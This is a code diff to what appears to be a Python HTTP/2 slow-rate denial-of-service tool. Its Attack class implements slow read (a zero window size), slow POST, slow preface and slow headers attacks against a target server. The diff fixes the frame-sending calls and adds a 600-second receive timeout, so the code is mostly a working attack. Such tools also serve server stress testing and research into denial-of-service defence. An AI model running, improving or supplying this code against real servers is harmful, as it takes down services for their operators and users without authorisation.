@@ -1,5 +1,6 @@
 import socket
 import h2.connection
+import time
 from h2.config import H2Configuration
 from hyperframe.frame import SettingsFrame, WindowUpdateFrame, HeadersFrame
 from hpack.hpack_compat import Encoder
@@ -40,7 +41,7 @@ class Attack():
         LOGGER.info("SLOW READ ATTACK================================")
         h2conn._data_to_send += CONNECTION_PREFACE
         h2conn.update_settings({SettingsFrame.INITIAL_WINDOW_SIZE: 0})
-        conn.sendall(h2conn._data_to_send())
+        conn.sendall(h2conn.data_to_send())
         headers = [
             (":authority", args.target),
             (":path", "/"),
@@ -48,7 +49,7 @@ class Attack():
             (":method", "GET")
         ]
         h2conn.send_headers(1, headers, end_stream=True)
-        conn.sendall(h2conn._data_to_send())
+        conn.sendall(h2conn.data_to_send())
     
     def slow_post(self, conn, h2conn):
         LOGGER.info("SLOW POST ATTACK================================")
@@ -57,7 +58,7 @@ class Attack():
         wf.window_increment = WINDOW_SIZE_INCREMENT
 
         h2conn._data_to_send += wf.serialize()
-        conn.sendall(h2conn._data_to_send())
+        conn.sendall(h2conn.data_to_send())
 
         headers = [
             (":authority", args.target),
@@ -75,7 +76,7 @@ class Attack():
 
     def slow_preface(self, conn, h2conn):
         LOGGER.info("SLOW PREFACE ATTACK=============================")
-        h2conn.sendall(h2conn.data_to_send())
+        h2conn._data_to_send += CONNECTION_PREFACE
         conn.sendall(h2conn.data_to_send())
 
     def slow_headers(self, conn, h2conn, method="GET"):
@@ -125,17 +126,23 @@ class Attack():
         
         with cons.get_lock():
             cons.value += 1
+
+        start_time = time.time()
         
         try:
             self.ATTACKS[self.type](self.connection, self.http2_connection)
         except Exception:
             print("Invalid Attack Type !!!")
 
-        while True:
-            data = self.connection.recv(1024)
-            LOGGER.info("DATA: {}".format(data))
-            if not data:
-                break
+        self.connection.settimeout(600)
+        try:
+            while True:
+                data = self.connection.recv(1024)
+                LOGGER.info("DATA: {}".format(data))
+                if not data:
+                    break
+        except socket.timeout:
+            LOGGER.info("Server does not responded in 600 secs.")
 
         with closed.get_lock():
             closed.value += 1
